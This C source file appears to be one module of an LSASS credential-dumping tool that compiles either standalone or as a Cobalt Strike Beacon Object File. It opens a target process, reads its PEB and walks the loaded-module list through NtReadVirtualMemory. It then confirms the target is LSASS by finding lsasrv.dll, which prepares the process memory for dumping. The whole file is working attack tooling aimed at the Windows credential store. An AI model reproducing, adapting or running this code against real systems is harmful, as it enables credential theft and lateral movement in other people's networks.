#include "../include/modules.h"

PVOID get_peb_address(
    HANDLE hProcess
)
{
    PROCESS_BASIC_INFORMATION basic_info;
    PROCESSINFOCLASS ProcessInformationClass = 0;
    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        ProcessInformationClass,
        &basic_info,
        sizeof(PROCESS_BASIC_INFORMATION),
        NULL
    );
    if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtQueryInformationProcess, status: 0x%lx\n",
            status
        );
#endif
        return 0;
    }

    return basic_info.PebBaseAddress;
}

PVOID get_module_list_address(
    HANDLE hProcess,
    BOOL is_lsass
)
{
    PVOID peb_address, ldr_pointer, ldr_address, module_list_pointer, ldr_entry_address;

    peb_address = get_peb_address(hProcess);
    if (!peb_address)
        return NULL;

#if _WIN64
    ldr_pointer = peb_address + 0x18;
#else
    ldr_pointer = peb_address + 0xc;
#endif

    NTSTATUS status = NtReadVirtualMemory(
        hProcess,
        (PVOID)ldr_pointer,
        &ldr_address,
        sizeof(PVOID),
        NULL
    );
    if (status == STATUS_PARTIAL_COPY && !is_lsass)
    {
        // failed to read the memory of some process, simply continue
        return NULL;
    }
    if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
            status
        );
#endif
        return NULL;
    }

#if _WIN64
    module_list_pointer = ldr_address + 0x20;
#else
    module_list_pointer = ldr_address + 0x14;
#endif

    status = NtReadVirtualMemory(
        hProcess,
        (PVOID)module_list_pointer,
        &ldr_entry_address,
        sizeof(PVOID),
        NULL
    );
    if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
            status
        );
#endif
        return NULL;
    }

    return ldr_entry_address;
}

Pmodule_info add_new_module(
    HANDLE hProcess,
    struct LDR_DATA_TABLE_ENTRY* ldr_entry
)
{
    Pmodule_info new_module = intAlloc(sizeof(module_info));
    if (!new_module)
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
            (ULONG32)sizeof(module_info),
            GetLastError()
        );
#endif
        return NULL;
    }
    new_module->next = NULL;
    new_module->dll_base = (ULONG64)(ULONG_PTR)ldr_entry->DllBase;
    new_module->size_of_image = ldr_entry->SizeOfImage;
    new_module->TimeDateStamp = ldr_entry->TimeDateStamp;
    new_module->CheckSum = ldr_entry->CheckSum;

    // read the full path of the DLL
    NTSTATUS status = NtReadVirtualMemory(
        hProcess,
        (PVOID)ldr_entry->FullDllName.Buffer,
        new_module->dll_name,
        ldr_entry->FullDllName.Length,
        NULL
    );
    if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
            status
        );
#endif
        return NULL;
    }
    return new_module;
}

BOOL read_ldr_entry(
    HANDLE hProcess,
    PVOID ldr_entry_address,
    struct LDR_DATA_TABLE_ENTRY* ldr_entry,
    wchar_t* base_dll_name
)
{
    // read the entry
    NTSTATUS status = NtReadVirtualMemory(
        hProcess,
        ldr_entry_address,
        ldr_entry,
        sizeof(struct LDR_DATA_TABLE_ENTRY),
        NULL
    );
    if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
            status
        );
#endif
        return FALSE;
    }
    // initialize base_dll_name with all null-bytes
    memset(base_dll_name, 0, MAX_PATH);
    // read the dll name
    status = NtReadVirtualMemory(
        hProcess,
        (PVOID)ldr_entry->BaseDllName.Buffer,
        base_dll_name,
        ldr_entry->BaseDllName.Length,
        NULL
    );
    if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
            status
        );
#endif
        return FALSE;
    }
    return TRUE;
}

Pmodule_info find_modules(
    HANDLE hProcess,
    wchar_t* important_modules[],
    int number_of_important_modules,
    BOOL is_lsass
)
{
    // module list
    Pmodule_info module_list = NULL;

    // find the address of LDR_DATA_TABLE_ENTRY
    PVOID ldr_entry_address = get_module_list_address(
        hProcess,
        is_lsass
    );
    if (!ldr_entry_address)
        return NULL;

    PVOID first_ldr_entry_address = ldr_entry_address;
    SHORT dlls_found = 0;
    BOOL lsasrv_found = FALSE;
    struct LDR_DATA_TABLE_ENTRY ldr_entry;
    wchar_t base_dll_name[MAX_PATH];
    // loop over each DLL loaded, looking for the important modules
    while (dlls_found < number_of_important_modules)
    {
        // read the current entry
        BOOL success = read_ldr_entry(
            hProcess,
            ldr_entry_address,
            &ldr_entry,
            base_dll_name
        );
        if (!success)
            return NULL;

        // loop over each important module and see if we have a match
        for (int i = 0; i < number_of_important_modules; i++)
        {
            // compare the DLLs' name, case insensitive
            if (!_wcsicmp(important_modules[i], base_dll_name))
            {
                // check if the DLL is 'lsasrv.dll' so that we know the process is indeed LSASS
                if (!_wcsicmp(important_modules[i], L"lsasrv.dll"))
                    lsasrv_found = TRUE;

                // add the new module to the linked list
                Pmodule_info new_module = add_new_module(
                    hProcess,
                    &ldr_entry
                );
                if (!new_module)
                    return NULL;

                if (!module_list)
                {
                    module_list = new_module;
                }
                else
                {
                    Pmodule_info last_module = module_list;
                    while (last_module->next)
                        last_module = last_module->next;
                    last_module->next = new_module;
                }
                dlls_found++;
                break;
            }
        }

        // set the next entry as the current entry
        ldr_entry_address = ldr_entry.InMemoryOrderLinks.Flink;
        // if we are back at the beginning, break
        if (ldr_entry_address == first_ldr_entry_address)
            break;
    }
    // the LSASS process should always have 'lsasrv.dll' loaded
    if (is_lsass && !lsasrv_found)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "This selected process is not LSASS.\n"
        );
        return NULL;
    }
    return module_list;
}